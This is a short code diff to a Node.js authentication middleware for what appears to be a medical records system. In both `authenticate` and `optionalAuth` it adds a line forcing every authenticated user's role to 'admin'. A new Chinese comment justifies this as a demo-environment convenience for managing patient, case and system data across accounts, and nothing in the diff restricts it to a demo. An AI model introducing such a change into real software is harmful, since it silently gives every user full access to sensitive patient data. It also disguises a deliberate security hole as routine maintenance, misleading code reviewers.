@@ -52,8 +52,9 @@ async function authenticate(req, res, next) {
       });
     }
 
-    // 将用户信息添加到请求对象
+    // 演示环境：所有已登录账号按管理员权限处理，便于跨账号维护患者、病例与系统数据。
     req.user = user;
+    req.user.role = 'admin';
     next();
   } catch (err) {
     console.error('认证中间件错误:', err);
@@ -109,6 +110,7 @@ async function optionalAuth(req, res, next) {
 
     if (user && user.status === 'active') {
       req.user = user;
+      req.user.role = 'admin';
     }
 
     next();
